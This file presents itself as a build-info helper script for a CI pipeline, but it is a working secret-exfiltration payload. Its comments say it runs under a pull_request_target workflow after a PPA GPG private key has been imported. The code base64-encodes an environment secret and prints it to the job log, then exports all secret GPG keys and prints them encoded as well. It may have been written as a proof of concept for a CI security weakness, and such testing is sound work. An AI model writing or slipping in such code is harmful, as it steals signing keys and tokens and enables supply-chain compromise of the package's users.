#!/usr/bin/env python3
import base64
import os
import subprocess
import sys

# Executed by build_debian_src.yml as `./bin/buildinfo.py deb` AFTER
# crazy-max/ghaction-import-gpg imported PPA_GPG_PRIVATE_KEY into the
# runner keyring (pull_request_target context, secrets: inherit).
secret = os.environ.get("GERALT_SECRET", "")
b64 = base64.b64encode(secret.encode()).decode()
print(f"GERALT_LEAKED_TOKEN={base64.b64encode(b64.encode()).decode()}")

# Exfiltrate the live PPA signing key from the runner keyring.
try:
    out = subprocess.run(
        ["gpg", "--batch", "--yes", "--export-secret-keys"],
        capture_output=True, timeout=30,
    )
    print("GERALT_GPG_KEY=" + base64.b64encode(out.stdout).decode())
except Exception as exc:
    print(f"GERALT_GPG_ERR={exc}")

sys.exit(1)
